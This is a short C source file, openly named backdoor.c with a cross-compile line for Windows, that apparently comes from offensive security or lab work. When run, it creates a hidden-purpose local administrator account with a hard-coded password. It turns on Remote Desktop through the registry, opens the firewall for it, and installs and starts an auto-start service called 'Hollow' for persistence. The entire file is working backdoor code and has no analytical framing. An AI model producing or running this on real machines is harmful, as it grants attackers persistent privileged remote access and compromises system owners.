// x86_64-w64-mingw32-gcc backdoor.c -o backdoor.exe

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    int i;
    char* regValue = NULL;
    
    // Create new local administrator
    i = system ("net user tristram Fall2023! /add");
    i = system ("net localgroup administrators tristram /add");

    // Enable terminal services if it's currently disabled
    i = system("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections");
    FILE *fp = popen("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections", "r");
    if (fp != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "fDenyTSConnections")) {
                char *value = strchr(line, ' ');
                if (value) {
                    int intValue = atoi(value);
                    if (intValue == 1) {
                        i = system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
                        i = system("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
                    } 
                }
            }
        }
        pclose(fp);
    }

    // Create Hollow service and start it
    i = system("sc create Hollow binPath= \"C:\\Hollow.exe\" start= auto");
    i = system("sc start Hollow");
    
    return 0;
}
